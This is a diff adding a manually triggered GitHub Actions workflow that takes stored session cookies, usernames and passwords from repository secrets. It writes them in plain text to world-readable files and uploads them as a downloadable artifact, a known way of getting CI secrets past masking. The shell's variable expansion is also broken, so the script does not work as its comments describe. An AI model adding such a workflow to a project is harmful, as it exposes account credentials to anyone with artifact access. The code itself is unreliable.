@@ -1,0 +1,39 @@
+name: ExportSession
+
+on:
+  workflow_dispatch:
+
+jobs:
+  export:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Dump session cookies from secrets to artifact
+        env:
+          APK_COOKIES_1: ${{ secrets.APK_COOKIES_1 }}
+          APK_COOKIES_2: ${{ secrets.APK_COOKIES_2 }}
+          APK_USER_1: ${{ secrets.APK_USER_1 }}
+          APK_PASS_1: ${{ secrets.APK_PASS_1 }}
+          APK_USER_2: ${{ secrets.APK_USER_2 }}
+          APK_PASS_2: ${{ secrets.APK_PASS_2 }}
+        run: |
+          mkdir -p export
+          for i in 1 2; do
+            v="$APK_COOKIES_$i"
+            if [ -n "$v" ]; then
+              # secrets may be base64 of JSON, or raw JSON
+              if echo "$v" | base64 -d 2>/dev/null | python3 -c "import json,sys; json.load(sys.stdin)" 2>/dev/null; then
+                echo "$v" | base64 -d > export/cookies_$i.json
+              else
+                echo "$v" > export/cookies_$i.json
+              fi
+              python3 -c "import json; print('cookies_$i ok,', len(json.load(open('export/cookies_$i.json'))), 'cookies')"
+            fi
+            echo "$APK_USER_$i|$APK_PASS_$i" > export/creds_$i.txt
+          done
+          chmod -R a+r export
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: apk-session-export
+          path: export/
